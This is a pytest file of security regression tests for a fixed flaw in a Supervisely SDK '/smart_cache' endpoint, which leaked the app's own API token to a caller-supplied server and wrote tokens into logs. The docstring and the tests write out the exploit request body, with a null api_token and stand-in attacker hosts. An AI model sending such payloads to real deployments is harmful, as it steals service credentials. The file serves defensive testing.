"""
Security tests for the ``/smart_cache`` token exfiltration fix.

``InferenceImageCache.cache_task`` used to build ``sly.Api(state["server_address"],
state["api_token"])`` whenever both keys were *present* in the request state. ``sly.Api``
falls back to the app's own ``API_TOKEN`` environment variable when the token is ``None``,
so a request body like::

    {"state": {"server_address": "https://attacker.host", "api_token": null, "image_ids": [1]}}

made the app send its own token in the ``x-api-key`` header to the caller-chosen server.
The same line also wrote the whole request state, including ``api_token``, to the log.

Layout of this file:

* exploit tests - perform the attack through ``cache_task`` and through the real
  ``/smart_cache`` route (FastAPI ``TestClient`` + the SDK request-state middleware) and
  assert that the app token never leaves the app's own platform and that tokens are not
  logged. They fail on the unfixed code.
* invariant / regression tests - behaviour that has to hold before and after the fix
  (credentials supplied by the caller are still honoured, the api passed in is still used).

No real network is used: the ``requests`` transport adapter is replaced with a recorder and
every host name is under the reserved ``.invalid`` TLD.
"""

import io
import logging
import os
from pathlib import Path
from typing import Dict, List, NamedTuple, Optional, Union
from unittest import mock
from urllib.parse import urlparse

import httpx
import numpy as np
import pytest
import requests
from fastapi import FastAPI, UploadFile
from fastapi.testclient import TestClient

import supervisely as sly
from supervisely.app.fastapi.subapp import _init as init_app_server
from supervisely.nn.inference.cache import InferenceImageCache
from supervisely.sly_logger import create_formatter

# the app's own credentials (environment of the serving app)
PLATFORM = "https://platform.invalid"
APP_TOKEN = "app-own-secret-token-" + "a" * 107

# server controlled by the attacker
ATTACKER = "https://attacker.invalid"

# credentials a legitimate caller sends on its own behalf
CALLER_SERVER = "https://caller-platform.invalid"
CALLER_TOKEN = "caller-own-token-" + "c" * 111
USER_TOKEN = "logged-in-user-token-" + "u" * 107

LOG_MESSAGE = "Request state in cache endpoint"


class HttpCall(NamedTuple):
    """One outgoing HTTP request intercepted before it could reach the network."""

    method: str
    url: str
    headers: Dict[str, str]
    body: Optional[Union[str, bytes]]


def create_img() -> np.ndarray:
    return np.zeros((8, 8, 3), dtype=np.uint8)


def host_of(address: str) -> str:
    if "://" not in address:
        address = "http://" + address
    return urlparse(address).hostname


def mentions(call: HttpCall, secret: str) -> bool:
    """True if the secret is anywhere in the request: url, headers or body."""
    parts = [call.url]
    parts.extend(f"{name}: {value}" for name, value in call.headers.items())
    body = call.body
    if isinstance(body, bytes):
        body = body.decode("utf-8", errors="replace")
    if isinstance(body, str):
        parts.append(body)
    return any(secret in part for part in parts)


def app_token_leaks(built_apis: List[sly.Api], http_calls: List[HttpCall]) -> List[str]:
    """Everything that carried the app's own token to a host other than the app's platform."""
    platform_host = host_of(PLATFORM)
    leaks = []
    for api in built_apis:
        if api.token == APP_TOKEN or api.headers.get("x-api-key") == APP_TOKEN:
            hosts = {host_of(api.server_address), host_of(api.api_server_address)}
            if hosts != {platform_host}:
                leaks.append(f"sly.Api bound to {api.server_address} carries the app token")
    for call in http_calls:
        if mentions(call, APP_TOKEN) and host_of(call.url) != platform_host:
            leaks.append(f"{call.method} {call.url} carried the app token")
    return leaks


def calls_to(http_calls: List[HttpCall], address: str) -> List[HttpCall]:
    return [call for call in http_calls if host_of(call.url) == host_of(address)]


def cache_log_records(records: List[logging.LogRecord]) -> List[logging.LogRecord]:
    return [record for record in records if record.getMessage() == LOG_MESSAGE]


def render(record: logging.LogRecord) -> str:
    """The record as the SDK json formatter writes it to the app log."""
    return create_formatter().format(record)


def post_smart_cache(server: FastAPI, body: dict, raise_server_exceptions: bool = True) -> None:
    """Send the request to the real route; the cache task has finished when this returns."""
    client = TestClient(server, raise_server_exceptions=raise_server_exceptions)
    response = client.post("/smart_cache", json=body)
    assert response.status_code == 200, response.text
    assert response.json() == {"message": "Cache task started."}


@pytest.fixture(autouse=True)
def app_env(monkeypatch):
    """Environment of a running app: its own server address and its own secret token."""
    monkeypatch.setenv("SERVER_ADDRESS", PLATFORM)
    monkeypatch.setenv("API_TOKEN", APP_TOKEN)
    monkeypatch.delenv("SUPERVISELY_API_SERVER_ADDRESS", raising=False)
    monkeypatch.delenv("SUPERVISELY_MULTIUSER_APP_MODE", raising=False)
    # per-process memory of the "http -> https" probe, keep the tests independent
    monkeypatch.setattr(sly.Api, "_checked_servers", set())


@pytest.fixture(autouse=True)
def http_calls(monkeypatch) -> List[HttpCall]:
    """Record every outgoing HTTP request instead of sending it."""
    calls: List[HttpCall] = []
    png = sly.image.write_bytes(create_img(), "png")

    def fake_send(adapter, request, **kwargs):
        calls.append(HttpCall(request.method, request.url, dict(request.headers), request.body))
        response = requests.Response()
        response.status_code = 200
        response.reason = "OK"
        response.headers["Content-Type"] = "image/png"
        response._content = png
        response.url = request.url
        response.request = request
        return response

    def refuse(request):
        calls.append(HttpCall(request.method, str(request.url), dict(request.headers), None))
        raise httpx.ConnectError("real network is disabled in tests")

    def fake_handle_request(transport, request):
        refuse(request)

    async def fake_handle_async_request(transport, request):
        refuse(request)

    monkeypatch.setattr(requests.adapters.HTTPAdapter, "send", fake_send)
    # the SDK also has httpx based methods; TestClient uses its own in-process transport
    monkeypatch.setattr(httpx.HTTPTransport, "handle_request", fake_handle_request)
    monkeypatch.setattr(
        httpx.AsyncHTTPTransport, "handle_async_request", fake_handle_async_request
    )
    return calls


@pytest.fixture()
def built_apis(monkeypatch) -> List[sly.Api]:
    """Every sly.Api constructed while the test runs."""
    built: List[sly.Api] = []
    original_init = sly.Api.__init__

    def recording_init(self, *args, **kwargs):
        original_init(self, *args, **kwargs)
        built.append(self)

    monkeypatch.setattr(sly.Api, "__init__", recording_init)
    return built


@pytest.fixture()
def sly_log_records():
    """Records written to the SDK logger, with debug level enabled."""

    class ListHandler(logging.Handler):
        def __init__(self):
            super().__init__()
            self.records = []

        def emit(self, record):
            self.records.append(record)

    handler = ListHandler()
    previous_level = sly.logger.level
    sly.logger.addHandler(handler)
    sly.logger.setLevel(logging.DEBUG)
    yield handler.records
    sly.logger.setLevel(previous_level)
    sly.logger.removeHandler(handler)


@pytest.fixture()
def api_mock():
    """The api the route passes to the cache task (request.state.api)."""

    def get_n_frames_gen(vid, fids):
        for fid in fids:
            yield fid, create_img()

    def get_by_hashes_gen(hashes):
        for img_hash in hashes:
            yield img_hash, create_img()

    api = mock.MagicMock(name="request_api")
    api.video.frame.download_nps_generator.side_effect = get_n_frames_gen
    api.video.frame.download_np.side_effect = lambda vid, imid: create_img()
    api.image.download_nps_generator.side_effect = get_n_frames_gen
    api.image.download_np.side_effect = lambda im_id: create_img()
    api.image.download_nps_by_hashes_generator.side_effect = get_by_hashes_gen
    return api


@pytest.fixture()
def inf_cache(tmp_path: Path) -> InferenceImageCache:
    return InferenceImageCache(
        maxsize=10,
        ttl=100,
        base_folder=tmp_path,
    )


@pytest.fixture()
def smart_cache_server(inf_cache: InferenceImageCache) -> FastAPI:
    """Headless app server as Inference.serve() builds it: SDK middleware + the real route."""
    server = FastAPI()
    init_app_server(app=server, headless=True)
    inf_cache.add_cache_endpoint(server)
    return server


# Exploit tests: these fail on the unfixed code


@pytest.mark.parametrize(
    "attacker_address",
    [ATTACKER, "http://attacker.invalid", "attacker.invalid"],
    ids=["https", "http", "no-scheme"],
)
def test_cache_task_null_api_token_does_not_bind_app_token_to_attacker_host(
    inf_cache, api_mock, built_apis, http_calls, tmp_path: Path, attacker_address
):
    state = {"server_address": attacker_address, "api_token": None, "image_ids": [1, 2]}

    inf_cache.cache_task(api=api_mock, state=state)

    # Should not build an Api that carries the app token for the caller-chosen server
    assert app_token_leaks(built_apis, http_calls) == []
    assert calls_to(http_calls, ATTACKER) == []
    assert built_apis == []

    # Should load images with the api that came with the request
    assert api_mock.image.download_np.call_count == 2
    assert sorted(os.listdir(tmp_path)) == ["image_1.png", "image_2.png"]


@pytest.mark.parametrize(
    "credentials, expected_hosts",
    [
        ({}, []),
        ({"context": {"apiToken": USER_TOKEN}}, [host_of(PLATFORM)]),
        ({"server_address": PLATFORM, "api_token": USER_TOKEN}, [host_of(PLATFORM)]),
    ],
    ids=["anonymous", "user-context", "top-level-credentials"],
)
def test_smart_cache_route_null_api_token_does_not_send_app_token_to_attacker(
    smart_cache_server, built_apis, http_calls, credentials, expected_hosts
):
    body = {
        **credentials,
        "state": {"server_address": ATTACKER, "api_token": None, "image_ids": [1]},
    }

    # an anonymous request has no api at all (request.state.api is None) and its cache task
    # dies in the background, so server errors are not re-raised into the test
    post_smart_cache(smart_cache_server, body, raise_server_exceptions=False)

    # Should not send the app token to the attacker
    assert app_token_leaks(built_apis, http_calls) == []
    assert calls_to(http_calls, ATTACKER) == []

    # Should only talk to the platform, with the token that came with the request
    assert [host_of(call.url) for call in http_calls] == expected_hosts
    assert [call.headers.get("x-api-key") for call in http_calls] == [USER_TOKEN] * len(
        expected_hosts
    )
    assert not any(mentions(call, APP_TOKEN) for call in http_calls)


def test_cache_task_does_not_log_api_token(inf_cache, api_mock, sly_log_records):
    state = {"server_address": CALLER_SERVER, "api_token": CALLER_TOKEN, "image_ids": [5]}

    inf_cache.cache_task(api=api_mock, state=state)

    records = cache_log_records(sly_log_records)
    assert len(records) == 1

    # Should not put the token into the log record
    assert not hasattr(records[0], "api_token")
    for record in sly_log_records:
        assert CALLER_TOKEN not in render(record)
        assert APP_TOKEN not in render(record)

    # Should still log the rest of the state
    assert records[0].image_ids == [5]
    assert records[0].server_address == CALLER_SERVER

    # Should not strip the token from the state itself
    assert state["api_token"] == CALLER_TOKEN


def test_smart_cache_route_does_not_log_api_token(smart_cache_server, sly_log_records):
    state = {"server_address": CALLER_SERVER, "api_token": CALLER_TOKEN, "image_ids": [6]}

    post_smart_cache(smart_cache_server, {"state": state})

    records = cache_log_records(sly_log_records)
    assert len(records) == 1
    assert not hasattr(records[0], "api_token")
    for record in sly_log_records:
        assert CALLER_TOKEN not in render(record)
        assert APP_TOKEN not in render(record)


def test_cache_task_with_api_none_does_not_crash_on_log_line(inf_cache, sly_log_records):
    # request.state.api is None when a request has no credentials; the task used to die
    # with AttributeError on `api.logger` before it even looked at the state
    with pytest.raises(ValueError, match="State has no proper fields"):
        inf_cache.cache_task(api=None, state={"unexpected": 1})

    records = cache_log_records(sly_log_records)
    assert len(records) == 1
    assert records[0].unexpected == 1


def test_cache_files_task_does_not_log_api_token(inf_cache, sly_log_records, tmp_path: Path):
    state = {"api_token": CALLER_TOKEN, "image_ids": [9]}
    image_file = io.BytesIO(sly.image.write_bytes(create_img(), "png"))

    inf_cache.cache_files_task(files=[UploadFile(image_file, filename="9.png")], state=state)

    assert os.listdir(tmp_path) == ["image_9.png"]
    records = cache_log_records(sly_log_records)
    assert len(records) == 1
    assert not hasattr(records[0], "api_token")
    for record in sly_log_records:
        assert CALLER_TOKEN not in render(record)


# Invariant and regression tests: these pass before and after the fix


def test_api_without_token_falls_back_to_app_token(built_apis, http_calls):
    # The root cause, and a check that the helpers above are able to see a leak
    api = sly.Api(ATTACKER, None)
    api.image.download_np(1)

    assert api.headers["x-api-key"] == APP_TOKEN
    assert [call.url for call in http_calls] == [f"{ATTACKER}/public/api/v3/images.download"]
    assert http_calls[0].headers["x-api-key"] == APP_TOKEN
    assert app_token_leaks(built_apis, http_calls) == [
        f"sly.Api bound to {ATTACKER} carries the app token",
        f"POST {ATTACKER}/public/api/v3/images.download carried the app token",
    ]


@pytest.mark.parametrize("token_fields", [{}, {"api_token": ""}], ids=["missing", "empty"])
def test_cache_task_missing_or_empty_api_token_keeps_app_token_home(
    inf_cache, api_mock, built_apis, http_calls, token_fields
):
    state = {"server_address": ATTACKER, "image_ids": [1, 2], **token_fields}

    inf_cache.cache_task(api=api_mock, state=state)

    assert app_token_leaks(built_apis, http_calls) == []
    assert not any(mentions(call, APP_TOKEN) for call in http_calls)


@pytest.mark.parametrize("token_fields", [{}, {"api_token": ""}], ids=["missing", "empty"])
def test_smart_cache_route_missing_or_empty_api_token_keeps_app_token_home(
    smart_cache_server, built_apis, http_calls, token_fields
):
    body = {"state": {"server_address": ATTACKER, "image_ids": [1], **token_fields}}

    post_smart_cache(smart_cache_server, body, raise_server_exceptions=False)

    assert app_token_leaks(built_apis, http_calls) == []
    assert not any(mentions(call, APP_TOKEN) for call in http_calls)


def test_cache_task_builds_api_from_caller_server_address_and_api_token(
    inf_cache, api_mock, built_apis, http_calls, tmp_path: Path
):
    state = {"server_address": CALLER_SERVER, "api_token": CALLER_TOKEN, "image_ids": [7]}

    inf_cache.cache_task(api=api_mock, state=state)

    # Should build the Api from the credentials in the state
    assert [(api.server_address, api.token) for api in built_apis] == [
        (CALLER_SERVER, CALLER_TOKEN)
    ]
    assert built_apis[0].headers["x-api-key"] == CALLER_TOKEN

    # Should load the image with it and not with the api passed in
    assert [(call.method, call.url) for call in http_calls] == [
        ("POST", f"{CALLER_SERVER}/public/api/v3/images.download")
    ]
    assert http_calls[0].headers["x-api-key"] == CALLER_TOKEN
    assert not any(mentions(call, APP_TOKEN) for call in http_calls)
    api_mock.image.download_np.assert_not_called()
    assert os.listdir(tmp_path) == ["image_7.png"]


def test_smart_cache_route_builds_api_from_caller_server_address_and_api_token(
    smart_cache_server, built_apis, http_calls, tmp_path: Path
):
    # no context and no top-level credentials: request.state.api is None
    state = {"server_address": CALLER_SERVER, "api_token": CALLER_TOKEN, "image_ids": [7]}

    post_smart_cache(smart_cache_server, {"state": state})

    assert [(api.server_address, api.token) for api in built_apis] == [
        (CALLER_SERVER, CALLER_TOKEN)
    ]
    assert [(call.method, call.url) for call in http_calls] == [
        ("POST", f"{CALLER_SERVER}/public/api/v3/images.download")
    ]
    assert http_calls[0].headers["x-api-key"] == CALLER_TOKEN
    assert not any(mentions(call, APP_TOKEN) for call in http_calls)
    assert os.listdir(tmp_path) == ["image_7.png"]


@pytest.mark.parametrize(
    "state, existing",
    [
        ({"image_ids": [1, 2]}, ["image_1.png", "image_2.png"]),
        ({"image_ids": [1, 2], "dataset_id": 7}, ["image_1.png", "image_2.png"]),
        ({"image_hashes": ["hashA", "hashB"]}, ["image_hashA.png", "image_hashB.png"]),
        (
            {"video_id": 3, "frame_ranges": [[0, 2]]},
            ["frame_3_0.png", "frame_3_1.png", "frame_3_2.png"],
        ),
        ({"video_id": 3, "frame_indexes": [4, 5]}, ["frame_3_4.png", "frame_3_5.png"]),
    ],
    ids=["image-ids", "image-ids-dataset", "image-hashes", "frame-ranges", "frame-indexes"],
)
def test_cache_task_without_credentials_uses_passed_api(
    inf_cache, api_mock, built_apis, http_calls, tmp_path: Path, state, existing
):
    inf_cache.cache_task(api=api_mock, state=state)

    # Should load everything with the api passed in
    assert sorted(os.listdir(tmp_path)) == sorted(existing)
    assert built_apis == []
    assert http_calls == []


@pytest.mark.parametrize(
    "credentials, expected_server, expected_token",
    [
        ({"context": {"apiToken": USER_TOKEN}}, PLATFORM, USER_TOKEN),
        (
            {"server_address": CALLER_SERVER, "api_token": CALLER_TOKEN},
            CALLER_SERVER,
            CALLER_TOKEN,
        ),
    ],
    ids=["user-context", "top-level-credentials"],
)
def test_smart_cache_route_without_state_credentials_uses_request_api(
    smart_cache_server,
    built_apis,
    http_calls,
    tmp_path: Path,
    credentials,
    expected_server,
    expected_token,
):
    body = {**credentials, "state": {"image_ids": [4]}}

    post_smart_cache(smart_cache_server, body)

    # Should use the api the middleware built for the request and nothing else
    assert [(api.server_address, api.token) for api in built_apis] == [
        (expected_server, expected_token)
    ]
    assert [(call.method, call.url) for call in http_calls] == [
        ("POST", f"{expected_server}/public/api/v3/images.download")
    ]
    assert http_calls[0].headers["x-api-key"] == expected_token
    assert not any(mentions(call, APP_TOKEN) for call in http_calls)
    assert os.listdir(tmp_path) == ["image_4.png"]
